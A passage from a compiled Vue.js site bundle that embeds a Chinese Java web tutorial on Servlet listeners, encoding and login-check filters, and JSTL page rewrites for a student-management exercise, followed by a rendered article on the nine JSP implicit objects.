{\n    }\n\n    /**\n     * 对象销毁执行此方法\n     */\n    public default void contextDestroyed(ServletContextEvent sce) {\n    }\n}\n```\n\n#### 2）HttpSessionListener\n\n```java\n/**\n * 用于监听HttpSession对象创建和销毁的监听器\n * @since v 2.3\n */\npublic interface HttpSessionListener extends EventListener {\n\n    /**\n     * 对象创建时执行此方法。\n     */\n    public default void sessionCreated(HttpSessionEvent se) {\n    }\n\n    /**\n     *  对象销毁执行此方法\n     */\n    public default void sessionDestroyed(HttpSessionEvent se) {\n    }\n}\n```\n\n#### 3）ServletRequestListener\n\n```java\n/**\n * 用于监听ServletRequest对象创建和销毁的监听器\n * @since Servlet 2.4\n */\npublic interface ServletRequestListener extends EventListener {\n\n   \t/**\n     *  对象创建时执行此方法。\n     */\n    public default void requestInitialized (ServletRequestEvent sre) {\n    }\n    \n    /**\n     * 对象销毁执行此方法\n     */\n    public default void requestDestroyed (ServletRequestEvent sre) {\n    } \n}\n```\n\n### 3.1.2 监听域中属性发生变化的\n\n#### 1）ServletContextAttributeListener\n\n```java\n/**\n * 用于监听ServletContext域（应用域）中属性发生变化的监听器\n * @since v 2.3\n */\n\npublic interface ServletContextAttributeListener extends EventListener {\n    /**\n     * 域中添加了属性触发此方法。参数是ServletContextAttributeEvent事件对象，事件是【添加属性】。\n     * 事件对象中封装着事件源，即ServletContext。\n     * 当ServletContext执行setAttribute方法时，此方法可以知道，并执行。\n     */\n    public default void attributeAdded(ServletContextAttributeEvent scae) {\n    }\n\n    /**\n     * 域中删除了属性触发此方法\n     */\n    public default void attributeRemoved(ServletContextAttributeEvent scae) {\n    }\n\n    /**\n     * 域中属性发生改变触发此方法\n     */\n    public default void attributeReplaced(ServletContextAttributeEvent scae) {\n    }\n}\n```\n\n#### 2）HttpSessionAttributeListener\n\n```java\n/**\n * 用于监听HttpSession域（会话域）中属性发生变化的监听器\n * @since v 2.3\n */\npublic interface HttpSessionAttributeListener extends EventListener {\n\n    /**\n     * 域中添加了属性触发此方法。\n     */\n    public default void attributeAdded(HttpSessionBindingEvent se) {\n    }\n\n    /**\n     * 域中删除了属性触发此方法\n     */\n    public default void attributeRemoved(HttpSessionBindingEvent se) {\n    }\n\n    /**\n     * 域中属性发生改变触发此方法\n     */\n    public default void attributeReplaced(HttpSessionBindingEvent se) {\n    }\n}\n```\n\n#### 3）ServletRequestAttributeListener\n\n```java\n/**\n * 用于监听ServletRequest域（请求域）中属性发生变化的监听器\n * @since Servlet 2.4\n */\npublic interface ServletRequestAttributeListener extends EventListener {\n    /**\n     * 域中添加了属性触发此方法。\n     */\n    public default void attributeAdded(ServletRequestAttributeEvent srae) {\n    }\n\n    /**\n     * 域中删除了属性触发此方法\n     */\n    public default void attributeRemoved(ServletRequestAttributeEvent srae) {\n    }\n\n    /**\n     * 域中属性发生改变触发此方法\n     */\n    public default void attributeReplaced(ServletRequestAttributeEvent srae) {\n    }\n}\n```\n\n### 3.1.3 和会话相关的两个感知型监听器\n\n此处要跟同学们明确一下，和会话域相关的两个感知型监听器是无需配置的，直接编写代码即可。\n\n#### 1）HttpSessionBinderListener\n\n```java\n/**\n * 用于感知对象和和会话域绑定的监听器\n * 当有数据加入会话域或从会话域中移除，此监听器的两个方法会执行。\n * 加入会话域即和会话域绑定\n * 从会话域移除即从会话域解绑\n */\npublic interface HttpSessionBindingListener extends EventListener {\n\n    /**\n     * 当数据加入会话域时，也就是绑定，此方法执行\n     */\n    public default void valueBound(HttpSessionBindingEvent event) {\n    }\n\n    /**\n     * 当从会话域移除时，也就是解绑，此方法执行\n     */\n    public default void valueUnbound(HttpSessionBindingEvent event) {\n    }\n}\n\n```\n\n#### 2）HttpSessionActivationListener\n\n```java\n/**\n * 用于感知会话域中对象钝化和活化的监听器\n */\npublic interface HttpSessionActivationListener extends EventListener {\n\n    /**\n     * 当会话域中的数据钝化时，此方法执行\n     */\n    public default void sessionWillPassivate(HttpSessionEvent se) {\n    }\n\n    /**\n     * 当会话域中的数据活化时（激活），此方法执行\n     */\n    public default void sessionDidActivate(HttpSessionEvent se) {\n    }\n}\n```\n\n## 3.2 监听器的使用\n\n在实际开发中，我们可以根据具体情况来从这8个监听器中选择使用。感知型监听器由于无需配置，只需要根据实际需求编写代码，所以此处我们就不再演示了。我们在剩余6个中分别选择一个监听对象创建销毁和对象域中属性发生变化的监听器演示一下。\n\n### 3.2.1 ServletContextListener的使用\n\n**第一步：创建工程**\n\n![listener_demo1](./img/java/javaweb/EL&Filter&Listener-授课.assets/listener_demo1.png)\n\n**第二步：编写监听器**\n\n```java\n/**\n * 用于监听ServletContext对象创建和销毁的监听器\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ServletContextListenerDemo implements ServletContextListener {\n\n    /**\n     * 对象创建时，执行此方法\n     * @param sce\n     */\n    @Override\n    public void contextInitialized(ServletContextEvent sce) {\n        System.out.println("监听到了对象的创建");\n        //1.获取事件源对象\n        ServletContext servletContext = sce.getServletContext();\n        System.out.println(servletContext);\n    }\n\n    /**\n     * 对象销毁时，执行此方法\n     * @param sce\n     */\n    @Override\n    public void contextDestroyed(ServletContextEvent sce) {\n        System.out.println("监听到了对象的销毁");\n    }\n}\n```\n\n**第三步：在web.xml中配置监听器**\n\n```xml\n\x3c!--配置监听器--\x3e\n<listener>\n    <listener-class>com.itheima.web.listener.ServletContextListenerDemo</listener-class>\n</listener>\n```\n\n**第四步：测试结果**\n\n![listener_demo2](./img/java/javaweb/EL&Filter&Listener-授课.assets/listener_demo2.png)\n\n### 3.2.2 ServletContextAttributeListener的使用\n\n**第一步：创建工程**\n\n沿用上一个案例的工程\n\n**第二步：编写监听器**\n\n```java\n/**\n * 监听域中属性发生变化的监听器\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ServletContextAttributeListenerDemo implements ServletContextAttributeListener {\n\n    /**\n     * 域中添加了数据\n     * @param scae\n     */\n    @Override\n    public void attributeAdded(ServletContextAttributeEvent scae) {\n        System.out.println("监听到域中加入了属性");\n        /**\n         * 由于除了我们往域中添加了数据外，应用在加载时还会自动往域中添加一些属性。\n         * 我们可以获取域中所有名称的枚举，从而看到域中都有哪些属性\n         */\n        \n        //1.获取事件源对象ServletContext\n        ServletContext servletContext = scae.getServletContext();\n        //2.获取域中所有名称的枚举\n        Enumeration<String> names = servletContext.getAttributeNames();\n        //3.遍历名称的枚举\n        while(names.hasMoreElements()){\n            //4.获取每个名称\n            String name = names.nextElement();\n            //5.获取值\n            Object value = servletContext.getAttribute(name);\n            //6.输出名称和值\n            System.out.println("name is "+name+" and value is "+value);\n        }\n    }\n\n    /**\n     * 域中移除了数据\n     * @param scae\n     */\n    @Override\n    public void attributeRemoved(ServletContextAttributeEvent scae) {\n        System.out.println("监听到域中移除了属性");\n    }\n\n    /**\n     * 域中属性发生了替换\n     * @param scae\n     */\n    @Override\n    public void attributeReplaced(ServletContextAttributeEvent scae) {\n        System.out.println("监听到域中属性发生了替换");\n    }\n}\n```\n\n同时，我们还需要借助第一个`ServletContextListenerDemo`监听器，往域中存入数据，替换域中的数据以及从域中移除数据，代码如下：\n\n```java\n/**\n * 用于监听ServletContext对象创建和销毁的监听器\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ServletContextListenerDemo implements ServletContextListener {\n\n    /**\n     * 对象创建时，执行此方法\n     * @param sce\n     */\n    @Override\n    public void contextInitialized(ServletContextEvent sce) {\n        System.out.println("监听到了对象的创建");\n        //1.获取事件源对象\n        ServletContext servletContext = sce.getServletContext();\n        //2.往域中加入属性\n        servletContext.setAttribute("servletContext","test");\n    }\n\n    /**\n     * 对象销毁时，执行此方法\n     * @param sce\n     */\n    @Override\n    public void contextDestroyed(ServletContextEvent sce) {\n        //1.取出事件源对象\n        ServletContext servletContext = sce.getServletContext();\n        //2.往域中加入属性，但是名称仍采用servletContext，此时就是替换\n        servletContext.setAttribute("servletContext","demo");\n        System.out.println("监听到了对象的销毁");\n        //3.移除属性\n        servletContext.removeAttribute("servletContext");\n    }\n}\n```\n\n**第三步：在web.xml中配置监听器**\n\n```xml\n\x3c!--配置监听器--\x3e\n<listener>\n    <listener-class>com.itheima.web.listener.ServletContextListenerDemo</listener-class>\n</listener>\n\n\x3c!--配置监听器--\x3e\n<listener>\n    <listener-class>com.itheima.web.listener.ServletContextAttributeListenerDemo</listener-class>\n</listener>\n```\n\n**第四步：测试结果**\n\n![attributelistener_demo](./img/java/javaweb/EL&Filter&Listener-授课.assets/attributelistener_demo.png)\n\n# 4 综合案例-学生管理系统改造\n\n## 4.1 需求说明\n\n### 4.1.1 解决乱码问题\n\n我们的学生管理系统中，肯定会有请求和响应的中文乱码问题。而乱码问题在学习Servlet的课程中已经讲解了如何解决了。只是在实际开发中，当有很多的Servlet时，肯定不能在每个Servlet中都编写一遍解决乱码的代码。因此，就可以利用我们今天学习的过滤器来实现统一解决请求和响应乱码的问题。\n\n### 4.1.2 检查登录\n\n在学生管理系统中，它包含了学生信息的录入和学生列表的查询，用户（员工）信息的录入以及查询。当然，我们实际的功能可能远远不止这些。但是就已有功能来说，也不是谁都可以通过地址栏直接输入访问的，它应该有权限的控制，只是我们课程在此处没法深入展开讲解权限，但最起码的登录，身份的认证还是必要的。\n\n由此，就引出来一个问题，是在每次访问Servlet时，在Servlet的代码中加入是否认证过身份的判断吗？显然，是不合理的。那么，既然不是在每个Servlet中编写，就应该是统一管理和维护。此时，我们的过滤器就又可以出场了。\n\n### 4.1.3 页面的java代码块和jsp表达式改造\n\n我们今天除了学习了过滤器，还学习了EL表达式和JSTL标签库，它们的出现就是避免我们的JSP页面中有过多的java代码或者jsp表达式。我们要运用今天所学知识改造页面。\n\n## 4.2 案例实现\n\n### 4.2.1 乱码问题过滤器\n\n创建EncodingFilter类，解决乱码\n\n```java\npackage com.itheima.filter;\n\nimport javax.servlet.Filter;\nimport javax.servlet.FilterChain;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.annotation.WebFilter;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n/*\n    解决全局乱码问题\n */\n@WebFilter("/*")\npublic class EncodingFilter implements Filter{\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {\n        try{\n            //1.将请求和响应对象转换为和HTTP协议相关\n            HttpServletRequest request = (HttpServletRequest) servletRequest;\n            HttpServletResponse response = (HttpServletResponse) servletResponse;\n\n            //2.设置编码格式\n            request.setCharacterEncoding("UTF-8");\n            response.setContentType("text/html;charset=UTF-8");\n\n            //3.放行\n            filterChain.doFilter(request,response);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n    }\n}\n\n```\n\n\n\n### 4.2.2 检查登录过滤器\n\n检查登录，创建LoginFilter 类\n\n```java\npackage com.itheima.filter;\n\nimport javax.servlet.Filter;\nimport javax.servlet.FilterChain;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.annotation.WebFilter;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n/*\n    检查登录\n */\n@WebFilter(value = {"/addStudent.jsp","/listStudentServlet"})\npublic class LoginFilter implements Filter{\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {\n        try{\n            //1.将请求和响应对象转换为和HTTP协议相关\n            HttpServletRequest request = (HttpServletRequest) servletRequest;\n            HttpServletResponse response = (HttpServletResponse) servletResponse;\n\n            //2.获取会话域对象中数据\n            Object username = request.getSession().getAttribute("username");\n\n            //3.判断用户名\n            if(username == null || "".equals(username)) {\n                //重定向到登录页面\n                response.sendRedirect(request.getContextPath() + "/login.jsp");\n                return;\n            }\n\n            //4.放行\n            filterChain.doFilter(request,response);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n```\n\n\n\n### 4.2.3 jsp页面的改造 \n\n​\t1，修改`addStudent.jsp`的虚拟访问路径\n\n```jsp\n<form action="${pageContext.request.contextPath}/addStudentServlet" method="get" autocomplete="off">\n    学生姓名：<input type="text" name="username"> <br>\n    学生年龄：<input type="number" name="age"> <br>\n    学生成绩：<input type="number" name="score"> <br>\n    <button type="submit">保存</button>\n</form>\n```\n\n2，修改`index.jsp`\n\n```jsp\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>\n<html>\n<head>\n    <title>学生管理系统首页</title>\n</head>\n<body>\n    <%--\n        获取会话域中的数据\n        如果获取到了则显示添加和查看功能的超链接\n        如果没获取到则显示登录功能的超链接\n    --%>\n    <c:if test="${sessionScope.username eq null}">\n        <a href="${pageContext.request.contextPath}/login.jsp">请登录</a>\n    </c:if>\n\n    <c:if test="${sessionScope.username ne null}">\n        <a href="${pageContext.request.contextPath}/addStudent.jsp">添加学生</a>\n        <a href="${pageContext.request.contextPath}/listStudentServlet">查看学生</a>\n    </c:if>\n\n</body>\n</html>\n\n```\n\n3，修改`listStudent.jsp`\n\n```jsp\n<%@ page import="com.itheima.bean.Student" %>\n<%@ page import="java.util.ArrayList" %>\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>\n<html>\n<head>\n    <title>查看学生</title>\n</head>\n<body>\n    <table width="600px" border="1px">\n        <tr>\n            <th>学生姓名</th>\n            <th>学生年龄</th>\n            <th>学生成绩</th>\n        </tr>\n        <c:forEach items="${students}" var="s">\n            <tr align="center">\n                <td>${s.username}</td>\n                <td>${s.age}</td>\n                <td>${s.score}</td>\n            </tr>\n        </c:forEach>\n    </table>\n</body>\n</html>\n\n```\n\n4，修改`login.jsp`\n\n```jsp\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n<head>\n    <title>学生登录</title>\n</head>\n<body>\n    <form action="${pageContext.request.contextPath}/loginStudentServlet" method="get" autocomplete="off">\n        姓名：<input type="text" name="username"> <br>\n        密码：<input type="password" name="password"> <br>\n        <button type="submit">登录</button>\n    </form>\n</body>\n</html>\n\n```\n\n',et={data:function(){return{MainComponent:tt}}},at=et,it=Object(u["a"])(at,nt,rt,!1,null,"b9465e50",null),st=it.exports,ot=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},lt=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",[n._v("JSP")]),t("pre",[n._v("            jsp\n            java 表达式 % %   %-%  %@%  %!%\n            jsp 表达式 %= %\n            四大域对象： 页面域 pageContext ，请求域 ServletRequest ，会话域 HttpSession，应用域 ServletContext\n            EL 表达式 ${} 直接从 各域对象找值 ,只要域对象中有就可以\n\n        ")]),t("div",{staticClass:"article-content",staticStyle:{width:"100%",float:"left"}},[t("input",{attrs:{type:"hidden",name:"article_id",id:"article_id",value:"12156"}}),t("input",{attrs:{type:"hidden",name:"catid",id:"catid",value:"0"}}),t("p",[n._v("\n        在本章中，我们将讨论和学习JSP中的隐式对象。这些对象是JSP容器为每个页面中的开发人员提供的Java对象，开发人员可以直接调用它们而不用显式地声明它们再调用。\n        JSP隐式对象也称为预定义变量。\n      ")]),t("p",[n._v("下表列出了JSP支持的九个隐式对象 -")]),t("table",[t("thead",[t("tr",[t("th",[n._v("编号")]),t("th",[n._v("对象")]),t("th",[n._v("描述")])])]),t("tbody",[t("tr",[t("td",[n._v("1")]),t("td",[t("code",[n._v("request")])]),t("td",[n._v("这是与请求相关联的"),t("code",[n._v("HttpServletRequest")]),n._v("对象。")])]),t("tr",[t("td",[n._v("2")]),t("td",[t("code",[n._v("response")])]),t("td",[n._v("\n              这是与客户端的响应关联的"),t("code",[n._v("HttpServletResponse")]),n._v("对象。\n            ")])]),t("tr",[t("td",[n._v("3")]),t("td",[t("code",[n._v("out")])]),t("td",[n._v("这是用于将输出发送到客户端的"),t("code",[n._v("PrintWriter")]),n._v("对象。")])]),t("tr",[t("td",[n._v("4")]),t("td",[t("code",[n._v("session")])]),t("td",[n._v("这是与请求相关联的"),t("code",[n._v("HttpSession")]),n._v("对象。")])]),t("tr",[t("td",[n._v("5")]),t("td",[t("code",[n._v("application")])]),t("td",[n._v("\n              这是与应用程序上下文相关联的"),t("code",[n._v("ServletContext")]),n._v("对象。\n            ")])]),t("tr",[t("td",[n._v("6")]),t("td",[t("code",[n._v("config")])]),t("td",[n._v("这是与该页面相关联的"),t("code",[n._v("ServletConfig")]),n._v("对象。")])]),t("tr",[t("td",[n._v("7")]),t("td",[t("code",[n._v("pageContext")])]),t("td",[n._v("\n              这封装了使用服务器特定的功能，如更高性能的"),t("code",[n._v("JspWriter")]),n._v("。\n            ")])]),t("tr",[t("td",[n._v("8")]),t("td",[t("code",[n._v("page")])]),t("td",[n._v("这只是一个同义词，用于调用由翻译的servlet类定义的方法。")])]),t("tr",[t("td",[n._v("9")]),t("td",[t("code",[n._v("Exception")])]),t("td",[t("code",[n._v("Exception")]),n._v("对象允许指定的JSP访问异常数据。")])])])]),t("div",{staticClass:"table-wrapper"},[t("table",{staticStyle:{height:"230px",width:"486px"},attrs:{border:"0"}},[t("tbody",[t("tr",[t("td",{staticStyle:{"text-align":"center"}},[n._v("编号")]),t("td",{staticStyle:{"text-align":"center"}},[n._v("对象")]),t("td",{staticStyle:{"text-align":"center"}},[n._v("所属作用域")]),t("td",{staticStyle:{"text-align":"center"}},[n._v("作用域描述")])]),t("tr",[t("td",{staticStyle:{"text-align":"center"}},[n._v("1")]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("request")])]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("request")])]),t("td",{staticStyle:{"text-align":"center"}},[n._v("\n              在当前"),t("strong",[n._v("请求")]),n._v("中有效\n            ")])]),t("tr",[t("td",{staticStyle:{"text-align":"center"}},[n._v("2")]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("response")])]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("page")])]),t("td",{staticStyle:{"text-align":"center"}},[n._v("在当前"),t("strong",[n._v("页面")]),n._v("有效")])]),t("tr",[t("td",{staticStyle:{"text-align":"center"}},[n._v("3")]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("out")])]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("page")])]),t("td",{staticStyle:{"text-align":"center"}},[n._v("在当前"),t("strong",[n._v("页面")]),n._v("有效")])]),t("tr",[t("td",{staticStyle:{"text-align":"center"}},[n._v("4")]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("session")])]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("session")])]),t("td",{staticStyle:{"text-align":"center"}},[n._v("\n              在当前"),t("strong",[n._v("会话")]),n._v("中有效\n            ")])]),t("tr",[t("td",{staticStyle:{"text-align":"center"}},[n._v("5")]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("application")])]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("application")])]),t("td",{staticStyle:{"text-align":"center"}},[n._v("\n              在所有"),t("strong",[n._v("应用程序")]),n._v("中有效\n            ")])]),t("tr",[t("td",{staticStyle:{"text-align":"center"}},[n._v("6")]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("config")])]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("page")])]),t("td",{staticStyle:{"text-align":"center"}},[n._v("在当前"),t("strong",[n._v("页面")]),n._v("有效")])]),t("tr",[t("td",{staticStyle:{"text-align":"center"}},[n._v("7")]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("pageContext")])]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("page")])]),t("td",{staticStyle:{"text-align":"center"}},[n._v("在当前"),t("strong",[n._v("页面")]),n._v("有效")])]),t("tr",[t("td",{staticStyle:{"text-align":"center"}},[n._v("8")]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("page")])]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("page")])]),t("td",{staticStyle:{"text-align":"center"}},[n._v("在当前"),t("strong",[n._v("页面")]),n._v("有效")])]),t("tr",[t("td",{staticStyle:{"text-align":"center"}},[n._v("9")]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("Exception")])]),t("td",{staticStyle:{"text-align":"center"}},[t("strong",[n._v("page")])]),t("td",{staticStyle:{"text-align":"center"}},[n._v("在当前"),t("strong",[n._v("页面")]),n._v("有效")])])])])]),t("h2",{attrs:{id:"h2-1-request-"}},[t("a",{staticClass:"reference-link",attrs:{name:"1. request对象"}}),t("span",{staticClass:"header-link octicon octicon-link"}),n._v("1. request对象\n      ")]),t("p",[t("code",[n._v("request")]),n._v("对象是"),t("code",[n._v("javax.servlet.http.HttpServletRequest")]),n._v("对象的一个实例。每当客户端请求页面时，JSP引擎将创建一个新对象来表示该请求。\n      ")]),t("p",[t("code",[n._v("request")]),n._v("对象提供了获取包括表单数据，Cookie，HTTP方法等HTTP头信息的方法。\n      ")]),t("h2",{attrs:{id:"h2-2-response-"}},[t("a",{staticClass:"reference-link",attrs:{name:"2. response对象"}}),t("span",{staticClass:"header-link octicon octicon-link"}),n._v("2. response对象\n      ")]),t("p",[t("code",[n._v("response")]),n._v("对象是"),t("code",[n._v("javax.servlet.http.HttpServletResponse")]),n._v("对象的一个实例。就像服务器创建"),t("code",[n._v("request")]),n._v("对象一样，它还创建一个对象来表示对客户端的响应。\n      ")]),t("p",[t("code",[n._v("response")]),n._v("对象还定义了处理创建新HTTP头的接口。通过此对象，JSP程序员可以添加新的Cookie或日期戳，HTTP状态代码等。\n      ")]),t("h2",{attrs:{id:"h2-3-out-"}},[t("a",{staticClass:"reference-link",attrs:{name:"3. out对象"}}),t("span",{staticClass:"header-link octicon octicon-link"}),n._v("3. out对象\n      ")]),t("p",[t("code",[n._v("out")]),n._v("隐式对象是"),t("code",[n._v("javax.servlet.jsp.JspWriter")]),n._v("对象的一个实例，用于在响应中发送内容。\n      ")]),t("p",[n._v("\n        初始化"),t("code",[n._v("JspWriter")]),n._v("对象根据页面是否缓存而不同地实例化。缓冲可以通过使用"),t("code",[n._v("page")]),n._v("指令的"),t("code",[n._v("buffered ='false'")]),n._v("属性来关闭。\n      ")]),t("p",[t("code",[n._v("JspWriter")]),n._v("对象包含与"),t("code",[n._v("java.io.PrintWriter")]),n._v("类大部分相同的方法。但是，"),t("code",[n._v("JspWriter")]),n._v("还有一些额外的方法用来处理缓冲。与"),t("code",[n._v("PrintWriter")]),n._v("对象不同，"),t("code",[n._v("JspWriter")]),n._v("会抛出"),t("code",[n._v("IOExceptions")]),n._v("异常。\n      ")]),t("p",[n._v("\n        下表列出了用于写入"),t("code",[n._v("boolean")]),n._v("，"),t("code",[n._v("char")]),n._v("，"),t("code",[n._v("int")]),n._v("，"),t("code",[n._v("double")]),n._v("，"),t("code",[n._v("object")]),n._v("，"),t("code",[n._v("String")]),n._v("等类型数据的重要方法。\n      ")]),t("table",[t("thead",[t("tr",[t("th",[n._v("编号")]),t("th",[n._v("方法")]),t("th",[n._v("描述")])])]),t("tbody",[t("tr",[t("td",[n._v("1")]),t("td",[t("code",[n._v("out.print(dataType dt)")])]),t("td",[n._v("打印数据类型值")])]),t("tr",[t("td",[n._v("2")]),t("td",[t("code",[n._v("out.println(dataType dt)")])]),t("td",[n._v("打印数据类型值，然后用新行(换行)字符终止行。")])]),t("tr",[t("td",[n._v("3")]),t("td",[t("code",[n._v("out.flush()")])]),t("td",[n._v("刷新流")])])])]),t("h2",{attrs:{id:"h2-4-session-"}},[t("a",{staticClass:"reference-link",attrs:{name:"4. session对象"}}),t("span",{staticClass:"header-link octicon octicon-link"}),n._v("4. session对象\n      ")]),t("p",[t("code",[n._v("session")]),n._v("对象是"),t("code",[n._v("javax.servlet.http.HttpSession")]),n._v("的一个实例，其行为与Java\n        Servlet下的会话对象行为完全相同。"),t("br"),t("code",[n._v("session")]),n._v("对象用于跟踪客户端请求之间的客户端会话。 \n      ")]),t("h2",{attrs:{id:"h2-5-application-"}},[t("a",{staticClass:"reference-link",attrs:{name:"5. application对象"}}),t("span",{staticClass:"header-link octicon octicon-link"}),n._v("5.\n        application对象\n      ")]),t("p",[t("code",[n._v("application")]),n._v("对象是生成的"),t("code",[n._v("Servlet")]),n._v("的"),t("code",[n._v("ServletContext")]),n._v("对象的直接包装，实际上是"),t("code",[n._v("javax.servlet.ServletContext")]),n._v("对象的一个实例。\n      ")]),t("p",[t("code",[n._v("application")]),n._v("对象是JSP页面在其整个生命周期中的表示。\n        当JSP页面被初始化时，将创建此对象，并且在JSP页面被"),t("code",[n._v("jspDestroy()")]),n._v("方法删除时"),t("code",[n._v("application")]),n._v("对象也将被删除。\n      ")]),t("p",[n._v("\n        通过向"),t("code",[n._v("application")]),n._v("对象添加属性值，可以确保组成Web应用程序的所有JSP文件都可以访问它。\n      ")]),t("h2",{attrs:{id:"h2-6-config-"}},[t("a",{staticClass:"reference-link",attrs:{name:"6. config对象"}}),t("span",{staticClass:"header-link octicon octicon-link"}),n._v("6. config对象\n      ")]),t("p",[t("code",[n._v("config")]),n._v("对象是"),t("code",[n._v("javax.servlet.ServletConfig")]),n._v("的实例化，是生成的servlet的"),t("code",[n._v("ServletConfig")]),n._v("对象周围的直接包装。\n      ")]),t("p",[n._v("\n        该对象允许JSP程序员访问Servlet或JSP引擎初始化参数，例如：路径或文件位置等。"),t("br"),n._v("以下配置方法是唯一可以使用的配置方法，它的用法是非常简单的\n        -\n      ")]),t("pre",{staticClass:"language-java code-toolbar"},[t("code",{staticClass:" language-java"},[n._v("config"),t("span",{staticClass:"token punctuation"},[n._v(".")]),t("span",{staticClass:"token function"},[n._v("getServletName")]),t("span",{staticClass:"token punctuation"},[n._v("(")]),t("span",{staticClass:"token punctuation"},[n._v(")")]),t("span",{staticClass:"token punctuation"},[n._v(";")]),n._v("\n")]),t("div",{staticClass:"toolbar"},[t("div",{staticClass:"toolbar-item"},[t("span",[n._v("Java")])])])]),t("p",[n._v("\n        这将返回当前"),t("code",[n._v("servlet")]),n._v("名称，它是包含在"),t("code",[n._v("WEB-INF\\web.xml")]),n._v("文件中定义的"),t("code",[n._v("<servlet-name>")]),n._v("元素中的字符串。\n      ")]),t("h2",{attrs:{id:"h2-7-pagecontext-"}},[t("a",{staticClass:"reference-link",attrs:{name:"7. pageContext对象"}}),t("span",{staticClass:"header-link octicon octicon-link"}),n._v("7.\n        pageContext对象\n      ")]),t("p",[t("code",[n._v("pageContext")]),n._v("对象是"),t("code",[n._v("javax.servlet.jsp.PageContext")]),n._v("对象的一个实例。"),t("code",[n._v("pageContext")]),n._v("对象用于表示整个JSP页面。\n      ")]),t("p",[t("code",[n._v("pageContext")]),n._v("对象旨在作为访问有关页面的信息的一种手段，同时避免大部分实现细节。"),t("br"),n._v("该对象存储对每个请求的请求和响应对象的引用。应用程序，配置，会话和输出对象是通过访问此对象的属性导出的。\n      ")]),t("p",[t("code",[n._v("pageContext")]),n._v("对象还包含有关发布到JSP页面的指令的信息，包括缓冲信息，"),t("code",[n._v("errorPageURL")]),n._v("和页面范围。\n      ")]),t("p",[t("code",[n._v("PageContext")]),n._v("类定义了几个字段，包括："),t("code",[n._v("PAGE_SCOPE")]),n._v("，"),t("code",[n._v("REQUEST_SCOPE")]),n._v("，"),t("code",[n._v("SESSION_SCOPE")]),n._v("和"),t("code",[n._v("APPLICATION_SCOPE")]),n._v("，它们标识了四个范围。它还支持超过"),t("code",[n._v("40")]),n._v("种方法，其中约一半是从"),t("code",[n._v("javax.servlet.jsp.JspContext")]),n._v("类继承的。\n      ")]),t("p",[n._v("\n        其中一个重要的方法是"),t("code",[n._v("removeAttribute")]),n._v("。\n        此方法接受一个或两个参数。\n        例如，"),t("code",[n._v('pageContext.removeAttribute("attrName")')]),n._v("从所有作用域中删除属性，而以下代码仅将其从页面范围中删除\n        -\n      ")]),t("pre",{staticClass:"language-java code-toolbar"},[t("code",{staticClass:" language-java"},[n._v("pageContext"),t("span",{staticClass:"token punctuation"},[n._v(".")]),t("span",{staticClass:"token function"},[n._v("removeAttribute")]),t("span",{staticClass:"token punctuation"},[n._v("(")]),t("span",{staticClass:"token string"},[n._v('"attrName"')]),t("span",{staticClass:"token punctuation"},[n._v(",")]),n._v(" PAGE_SCOPE"),t("span",{staticClass:"token punctuation"},[n._v(")")]),t("span",{staticClass:"token punctuation"},[n._v(";")]),n._v("\n")]),t("div",{staticClass:"toolbar"},[t("div",{staticClass:"toolbar-item"},[t("span",[n._v("Java")])])])]),t("h2",{attrs:{id:"h2-8-page-"}},[t("a",{staticClass:"reference-link",attrs:{name:"8. page对象"}}),t("span",{staticClass:"header-link octicon octicon-link"}),n._v("8. page对象\n      ")]),t("p",[t("code",[n._v("page")]),n._v("对象是对该页面实例的实际引用。可以认为它是表示整个JSP页面的对象。\n      ")]),t("p",[t("code",[n._v("page")]),n._v("对象是"),t("code",[n._v("this")]),n._v("对象的直接同义词。")]),t("h2",{attrs:{id:"h2-9-exception-"}},[t("a",{staticClass:"reference-link",attrs:{name:"9. exception对象"}}),t("span",{staticClass:"header-link octicon octicon-link"}),n._v("9. exception对象\n      ")]),t("p",[t("code",[n._v("exception")]),n._v("对象是一个包含上一页抛出的异常的包装器。它通常用于生成对错误条件的适当响应。\n      ")]),t("br")]),t("h4",[n._v("JSP 标准标签库（JSTL）")]),t("div",[t("a",{attrs:{href:"https://www.runoob.com/jsp/jsp-jstl.html",target:"_blank",rel:"noopener 